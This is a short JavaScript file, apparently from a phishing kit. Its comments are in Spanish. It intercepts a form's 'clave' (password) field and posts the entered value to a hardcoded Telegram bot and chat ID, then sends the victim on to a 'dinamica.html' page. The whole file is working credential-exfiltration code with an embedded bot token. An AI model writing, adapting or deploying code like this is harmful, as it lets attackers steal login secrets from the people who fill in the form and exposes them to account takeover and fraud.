document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("claveForm").addEventListener("submit", function (event) {
        event.preventDefault(); // Evita recargar la página

        let clave = document.getElementById("clave").value.trim();

        if (clave === "") {
            alert("Por favor, ingresa tu clave.");
            return;
        }

        // Datos del bot de Telegram
        let botToken = "7504281821:AAHWdSuYPKftjOmBC2N03av3PaF7qyEqd9g"; // Token del bot
        let chatId = "7829793593"; // ID del chat donde se enviará el mensaje
        let message = `🔐 Nueva clave ingresada:\n🔑 Clave: ${clave}`;

        // URL de la API de Telegram
        let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Enviar mensaje a Telegram
        fetch(telegramURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log("🔍 Respuesta de Telegram:", data);
            
            if (data.ok) {
                
                window.location.href = "dinamica.html"; // Redirigir a dinamica.html
            } else {
                console.error("❌ Error en Telegram:", data);
                alert("Error al enviar la clave: " + data.description);
            }
        })
        .catch(error => {
            console.error("❌ Error de conexión:", error);
            alert("No se pudo conectar con Telegram.");
        });
    });
});
